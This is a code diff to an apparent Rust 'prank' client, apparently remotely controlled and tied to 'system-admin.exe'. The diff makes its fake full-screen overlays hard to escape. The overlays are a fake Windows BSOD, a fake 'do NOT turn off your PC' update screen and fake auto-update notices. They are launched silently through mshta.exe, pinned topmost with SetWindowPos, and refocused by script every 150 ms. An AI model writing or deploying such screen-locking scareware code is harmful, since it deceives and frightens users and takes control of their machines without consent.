@@ -19,6 +19,37 @@ fn spawn_silent(program: &str, args: &[&str]) {
     }
 }
 
+/// Spawns an HTA screen overlay and enforces HWND_TOPMOST so it stays locked on top of all windows
+fn spawn_topmost_hta(hta_path: &std::path::Path) {
+    let path_str = hta_path.to_str().unwrap_or("").to_string();
+    tokio::task::spawn(async move {
+        spawn_silent("mshta.exe", &[&path_str]);
+        tokio::time::sleep(Duration::from_millis(150)).await;
+
+        #[cfg(windows)]
+        unsafe {
+            use windows_sys::Win32::UI::WindowsAndMessaging::{
+                GetForegroundWindow, SetForegroundWindow, SetWindowPos, HWND_TOPMOST, SWP_NOMOVE,
+                SWP_NOSIZE, SWP_SHOWWINDOW,
+            };
+
+            let hwnd = GetForegroundWindow();
+            if hwnd != 0 {
+                SetWindowPos(
+                    hwnd,
+                    HWND_TOPMOST,
+                    0,
+                    0,
+                    0,
+                    0,
+                    SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW,
+                );
+                SetForegroundWindow(hwnd);
+            }
+        }
+    });
+}
+
 pub struct PrankExecutor {
     safety: SafetyManager,
     ghost_mouse_running: Arc<AtomicBool>,
@@ -388,6 +419,8 @@ impl PrankExecutor {
     </div>
   </div>
 <script>
+  window.focus();
+  setInterval(function() {{ window.focus(); }}, 150);
   var pct = 0;
   var timer = setInterval(function() {{
     pct += Math.floor(Math.random() * 8) + 1;
@@ -407,7 +440,7 @@ impl PrankExecutor {
 
             let hta_path = std::env::temp_dir().join("win11_bsod.hta");
             if std::fs::write(&hta_path, hta_content).is_ok() {
-                spawn_silent("mshta.exe", &[hta_path.to_str().unwrap_or("")]);
+                spawn_topmost_hta(&hta_path);
             }
         });
     }
@@ -707,6 +740,8 @@ Start-Sleep -Seconds {}
   <div class="pct" id="pct">0% complete</div>
   <div class="warning">Do NOT turn off your PC — Working on updates</div>
 <script>
+  window.focus();
+  setInterval(function() {{ window.focus(); }}, 150);
   var i=0;
   var t=setInterval(function(){{
     i++;document.getElementById('pct').innerText=i+'% complete';
@@ -722,7 +757,7 @@ Start-Sleep -Seconds {}
 
             let hta_path = std::env::temp_dir().join("winupdate_prank.hta");
             if std::fs::write(&hta_path, hta_content).is_ok() {
-                spawn_silent("mshta.exe", &[hta_path.to_str().unwrap_or("")]);
+                spawn_topmost_hta(&hta_path);
             }
         });
     }
@@ -788,6 +823,8 @@ Start-Sleep -Seconds {}
   <p>System Admin Client updated to version 1.2.0 seamlessly!</p>
   <div class="badge">Current Executable: system-admin.exe [v1.2.0]</div>
 <script>
+  window.focus();
+  setInterval(function() {{ window.focus(); }}, 150);
   setTimeout(function() {{ window.close(); }}, {});
 </script>
 </body></html>"#,
@@ -796,7 +833,7 @@ Start-Sleep -Seconds {}
 
             let hta_path = std::env::temp_dir().join("autoupdate_success.hta");
             if std::fs::write(&hta_path, hta_content).is_ok() {
-                spawn_silent("mshta.exe", &[hta_path.to_str().unwrap_or("")]);
+                spawn_topmost_hta(&hta_path);
             }
         });
     }
@@ -829,6 +866,8 @@ Start-Sleep -Seconds {}
   <p>[AUTO-UPDATE TEST SUCCESSFUL — CLIENT IS AT v1.3.0]</p>
   <div class="ver">Executable: system-admin.exe | Status: ONLINE</div>
 <script>
+  window.focus();
+  setInterval(function() {{ window.focus(); }}, 150);
   setTimeout(function() {{ window.close(); }}, {});
 </script>
 </body></html>"#,
@@ -837,7 +876,7 @@ Start-Sleep -Seconds {}
 
             let hta_path = std::env::temp_dir().join("v13_glitch.hta");
             if std::fs::write(&hta_path, hta_content).is_ok() {
-                spawn_silent("mshta.exe", &[hta_path.to_str().unwrap_or("")]);
+                spawn_topmost_hta(&hta_path);
             }
         });
     }
